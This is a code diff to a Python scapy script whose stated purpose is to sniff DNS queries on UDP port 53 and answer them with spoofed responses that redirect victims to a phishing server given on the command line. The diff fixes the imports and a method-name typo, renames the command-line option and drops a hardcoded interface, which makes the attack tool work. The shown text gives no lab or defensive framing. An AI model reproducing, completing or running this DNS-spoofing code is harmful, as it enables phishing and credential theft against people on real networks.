@@ -6,14 +6,14 @@
 ##################### IMPORT WHAT WE NEED ###############
 
 import argparse # argparse to get arguments
-import scapy
+from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send
 
 
 
 # --------------------- REDIRECTS PACKETS FUNCTION ------------------------
 
 def redirect_packet(packet, phishing_ip):
-    if packet.hashlayer(DNSQR):
+    if packet.haslayer(DNSQR):
         print(f"DNS request captured : {packet[DNSQR].qname.decode()}")
 
         # Create response DNS to redirect to phishing server
@@ -32,7 +32,7 @@ def parse_args():
     parser = argparse.ArgumentParser(description="Sniff and redirect DNS query to phishing server.")
 
     # Options to configure phishing server IP
-    parser.add_argument("-t", "--phishing-ip", type=str, required=True,
+    parser.add_argument("-i", "--phishing-ip", type=str, required=True,
                         help="IP address of the phishing server to redirects each DNS query.")
 
     return parser.parse_args()
@@ -46,7 +46,7 @@ def main():
 
     phishing_ip = args.phishing_ip
 
-    sniff(iface="enp0s3", filter="udp port 53", prn=lambda packet: redirect_packet(packet, phishing_ip), store=0)
+    sniff(filter="udp port 53", prn=lambda packet: redirect_packet(packet, phishing_ip), store=0)
 
 
 if __name__ == "__main__":
